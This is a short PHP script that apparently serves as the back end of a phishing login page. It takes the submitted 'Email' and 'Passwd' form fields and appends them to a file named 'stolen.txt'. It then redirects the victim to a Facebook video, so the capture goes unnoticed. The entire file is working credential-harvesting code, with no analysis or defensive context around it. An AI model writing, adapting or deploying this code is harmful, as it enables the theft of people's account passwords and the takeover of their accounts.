<?php

	$myFile = "stolen.txt";
	$fh = fopen($myFile, 'a') or die("can't open file");
	fwrite($fh, "--------------------\n");
	$stringData = "username: " . $_POST['Email'] . "\n";
	fwrite($fh, $stringData);
	$stringData = "password: " . $_POST['Passwd'] . "\n";
	fwrite($fh, $stringData);
	fclose($fh);

	echo '<script>document.location.href="https://www.facebook.com/LADbible/videos/3024323284281508/"; </script>';
?>
